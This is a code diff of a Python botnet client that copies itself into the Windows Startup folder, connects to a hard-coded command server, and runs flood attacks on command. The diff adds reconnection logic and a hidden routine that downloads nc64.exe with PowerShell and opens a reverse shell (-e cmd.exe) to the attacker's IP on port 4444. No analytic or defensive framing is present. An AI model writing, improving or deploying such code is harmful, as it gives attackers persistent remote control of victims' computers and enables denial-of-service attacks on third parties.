@@ -6,6 +6,11 @@ import sys
 import shutil
 import random
 import multiprocessing
+import subprocess
+import tempfile
+
+
+should_reconnect = True
 
 def copy_to_startup_directory():
     try:
@@ -21,46 +26,70 @@ def copy_to_startup_directory():
         print("Script copied to the Startup directory successfully.")
     except Exception as e:
         print(f"Error copying script to Startup directory: {e}")
-    
+
     start_client()
 
 def receive_messages(client_socket):
-    while True:
-        data = client_socket.recv(1024).decode()
-        if not data:
-            break
+    global should_reconnect
+    while should_reconnect:
+        try:
+            data = client_socket.recv(1024).decode()
+            if not data:
+                break
 
-        print(f"Received from server: {data}")
+            print(f"Received from server: {data}")
 
-        # Check for disconnect messages
-        if data == 'disconnect':
-            print("Server has requested disconnect. Closing client...")
-            break
-        elif data == 'disconnect_all':
-            print("Server has requested all clients to disconnect. Closing client...")
-            break
+            # Check for disconnect messages
+            if data == 'disconnect':
+                print("Server has requested disconnect. Closing client...")
+                should_reconnect = False  # Set the flag to False to prevent reconnection
+                break
+            elif data == 'disconnect_all':
+                print("Server has requested all clients to disconnect. Closing client...")
+                should_reconnect = True  # Set the flag to False to prevent reconnection
+                break
 
-        # Perform any action based on the received message
-        if data == 'shell':
-            try:
-                os.system('powershell -command "Invoke-WebRequest -Uri \"http://143.42.5.48/nc64.exe\" -OutFile nc64.exe"')
-                os.system('start /B nc64.exe 143.42.5.48 4444 -e cmd.exe')
-            except Exception:
-                print(f"Failed to start shell: {Exception.message}")
-        
-        if data.startswith('attack'):
-            # Extract IP, threads, and timer from the received data
-            _, ip, threads, timer, port = data.split()
-            thread_attack(ip, int(threads), int(timer), int(port))
+            # Perform any action based on the received message
+            if data == 'shell':
+                download_and_run_nc()
+
+            if data.startswith('attack'):
+                # Extract IP, threads, and timer from the received data
+                _, ip, threads, timer, port = data.split()
+                thread_attack(ip, int(threads), int(timer), int(port))
+
+        except Exception as e:
+            print(f"Error in receive_messages: {e}")
 
     print("Server connection closed.")
     client_socket.close()
+
+    # Add a delay before attempting to reconnect
+    time.sleep(60)
+
+def download_and_run_nc():
+    try:
+        # Get the temporary folder path
+        temp_folder = tempfile.gettempdir()
+        # Full path to the downloaded 'nc64.exe' file in the temporary folder
+        nc_path = os.path.join(temp_folder, 'nc64.exe')
+        # PowerShell command to download 'nc64.exe' to the temporary folder
+        powershell_command = f'Invoke-WebRequest -Uri "http://143.42.5.48/nc64.exe" -OutFile "{nc_path}"'
+        # Run the PowerShell command
+        subprocess.Popen(['powershell', '-command', powershell_command], creationflags=subprocess.CREATE_NO_WINDOW)
+        # Wait for a moment to ensure the download completes
+        subprocess.Popen(['timeout', '/nobreak', '5'], shell=True).wait()
+        # Run 'nc64.exe' from the temporary folder
+        subprocess.Popen([os.path.join(temp_folder, 'nc64.exe'), '143.42.5.48', '4444', '-e', 'cmd.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
+
+    except Exception as e:
+        print(f"Failed to start shell: {e}")
 
 def start_client():
     host = '143.42.5.48'
     port = 443
 
-    while True:
+    while should_reconnect:
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.connect((host, port))
@@ -72,7 +101,6 @@ def start_client():
             receive_thread.start()
 
             receive_thread.join()  # Wait for the receive thread to finish
-            break  # Exit the loop when the receive thread completes
 
         except ConnectionRefusedError:
             print("Connection refused. Retrying in 5 seconds...")
